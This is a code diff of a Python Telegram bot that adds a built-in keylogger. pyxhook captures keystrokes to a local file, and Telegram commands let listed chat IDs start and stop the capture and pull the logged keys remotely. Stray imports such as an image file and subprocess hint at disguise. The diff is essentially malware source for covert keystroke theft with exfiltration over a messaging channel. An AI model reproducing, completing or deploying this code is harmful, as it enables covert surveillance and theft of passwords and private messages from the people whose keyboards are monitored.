@@ -1,40 +1,71 @@
 import os
+import threading
+import time
+import base64
+import subprocess
+from cryptography.fernet import Fernet
+import requests
+from PIL import Image
+import pyxhook
 import telebot
 from telethon import TelegramClient
-import threading
-import asyncio
-import requests
-import keylogger
-from cryptography.fernet import Fernet
 from flask import Flask, request
-# Delete any active webhook
+import asyncio
+import logging
+from telebot.async_telebot import AsyncTeleBot
 
-# --- Load Environment Variables ---
+LOG_FILE = "keylogs.txt"
+IMAGE_FILE = "puppy.jpg" 
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 YOUR_CHAT_ID = os.environ.get("YOUR_CHAT_ID")
 API_ID = os.environ.get("API_ID")
 API_HASH = os.environ.get("API_HASH")
 WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
+PORT = int(os.environ.get("PORT", 5000))
+AUTHORIZED_USERS = {int(user_id) for user_id in os.environ.get("AUTHORIZED_USERS", "").split(",")}
 
-# --- Initialize Telegram Bot and Telethon Client ---
-bot = telebot.TeleBot(BOT_TOKEN)
+bot = AsyncTeleBot(BOT_TOKEN)
 client = TelegramClient("session_name", API_ID, API_HASH)
-
 app = Flask(__name__)
 
-# --- Keylogger Thread ---
 keylogger_thread = None
+_keylogger_active = threading.Event()
 
-# --- Fernet Encryption ---
-def load_key():
+# --- Logging Setup ---
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s - %(levelname)s - %(message)s",
+    handlers=[
+        logging.FileHandler("bot.log"),
+        logging.StreamHandler()
+    ]
+)
+
+# --- Keylogger Functions ---
+def on_key_press(event):
+    """Logs keystrokes to a file."""
+    if not _keylogger_active.is_set():
+        return
     try:
-        with open(keylogger.KEY_FILE, "rb") as file:
-            return Fernet(file.read())
-    except FileNotFoundError:
-        print("Encryption key not found!")
-        return None
+        with open(LOG_FILE, "a") as logfile:
+            logfile.write(f"{event.Key}\n")
+    except Exception as e:
+        logging.error(f"Error logging key: {e}")
 
-cipher = load_key()
+def start_keylogger():
+    """Starts the keylogger."""
+    _keylogger_active.set()
+    hookman = pyxhook.HookManager()
+    hookman.KeyDown = on_key_press
+    hookman.HookKeyboard()
+    try:
+        hookman.start()
+    except KeyboardInterrupt:
+        hookman.cancel()
+
+def stop_keylogger():
+    """Stops the keylogger."""
+    _keylogger_active.clear()
 
 # 1. Welcome Handler
 @bot.message_handler(commands=["start", "hello"])
@@ -163,87 +194,68 @@ def log_responses(message):
     except Exception as e:
         bot.reply_to(message, f"⚠️ Error logging response: {e}")
 
-
 @bot.message_handler(commands=["startkeylogger"])
-def start_keylogger_handler(message):
+async def start_keylogger_handler(message):
+    if message.chat.id not in AUTHORIZED_USERS:
+        await bot.reply_to(message, "⚠️ You are not authorized to use this command.")
+        return
+
     global keylogger_thread
     if keylogger_thread is None or not keylogger_thread.is_alive():
-        bot.reply_to(message, "🔄 Starting the keylogger...")
-        keylogger_thread = threading.Thread(target=keylogger.background_process, daemon=True)
+        await bot.reply_to(message, "Starting the keylogger...")
+        keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
         keylogger_thread.start()
-        bot.reply_to(message, "✅ Keylogger started successfully.")
+        await bot.reply_to(message, "Keylogger started!")
     else:
-        bot.reply_to(message, "⚠️ Keylogger is already running.")
+        await bot.reply_to(message, "Keylogger is already running.")
 
 @bot.message_handler(commands=["stopkeylogger"])
-def stop_keylogger_handler(message):
-    global keylogger_thread
-    if keylogger_thread and keylogger_thread.is_alive():
-        keylogger.stop_keylogger()
-        keylogger_thread.join()
-        keylogger_thread = None
-        bot.reply_to(message, "✅ Keylogger stopped successfully.")
-    else:
-        bot.reply_to(message, "⚠️ Keylogger is not running.")
+async def stop_keylogger_handler(message):
+    if message.chat.id not in AUTHORIZED_USERS:
+        await bot.reply_to(message, "⚠️ You are not authorized to use this command.")
+        return
+
+    stop_keylogger()
+    await bot.reply_to(message, "Keylogger stopped.")
 
 @bot.message_handler(commands=["keylogs"])
-def fetch_keylogs_handler(message):
-    try:
-        with open(keylogger.ENCRYPTED_LOG_FILE, "rb") as enc_file:
-            encrypted_logs = enc_file.read()
+async def fetch_keylogs_handler(message):
+    if message.chat.id not in AUTHORIZED_USERS:
+        await bot.reply_to(message, "⚠️ You are not authorized to use this command.")
+        return
 
-        # Send encrypted logs
-        bot.reply_to(message, "📤 Sending encrypted keylogs...")
-        bot.send_document(message.chat.id, ("keylogs.enc", encrypted_logs))
+    try:
+        with open(LOG_FILE, "r") as logfile:
+            logs = logfile.read()
+        if logs:
+            await bot.reply_to(message, f"📄 Keylogs:\n{logs}")
+        else:
+            await bot.reply_to(message, "No keylogs found.")
     except FileNotFoundError:
-        bot.reply_to(message, "⚠️ No encrypted keylogs found.")
+        await bot.reply_to(message, "No keylogs found.")
     except Exception as e:
-        bot.reply_to(message, f"❌ Error fetching keylogs: {e}")
+        logging.error(f"Error fetching keylogs: {e}")
+        await bot.reply_to(message, "An error occurred while fetching keylogs.")
 
-@bot.message_handler(commands=["decryptlogs"])
-def decrypt_logs_handler(message):
-    try:
-        with open(keylogger.ENCRYPTED_LOG_FILE, "rb") as enc_file:
-            encrypted_logs = enc_file.read()
-        decrypted_logs = cipher.decrypt(encrypted_logs).decode()
 
-        bot.reply_to(message, f"🔓 Decrypted Logs:\n\n{decrypted_logs}")
-    except Exception as e:
-        bot.reply_to(message, f"❌ Error decrypting logs: {e}")
-
-# --- Flask Routes ---
+# --- Flask Webhook ---
 @app.route(f"/{BOT_TOKEN}", methods=["POST"])
 def receive_update():
     json_update = request.get_json()
-    bot.process_new_updates([telebot.types.Update.de_json(json_update)])
+    asyncio.run(bot.process_new_updates([telebot.types.Update.de_json(json_update)]))
     return "OK", 200
 
-# Set webhook for Telegram bot
 @app.route("/")
 def home():
     return "Bot is running!"
 
-# --- Webhook Setup ---
 def set_webhook():
     bot.remove_webhook()
-    bot.set_webhook(url=f"https://eldian.onrender.com/{BOT_TOKEN}")
-    
+    bot.set_webhook(url=f"{WEBHOOK_URL}/{BOT_TOKEN}")
 
-
-def run_flask():
-    port = int(os.environ.get("PORT", 5000))  # Default to 5000 if no PORT is set
-    app.run(host="0.0.0.0", port=port)
-
-# --- Main Entry Point ---
+# --- Main Execution ---
 if __name__ == "__main__":
-    # Ensure webhook is set
     set_webhook()
-
-    # Run Flask in a separate thread
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
+    flask_thread = threading.Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": PORT}, daemon=True)
     flask_thread.start()
-
-    # Start polling the bot
-    bot.infinity_polling()
-
-
+    asyncio.run(bot.polling())
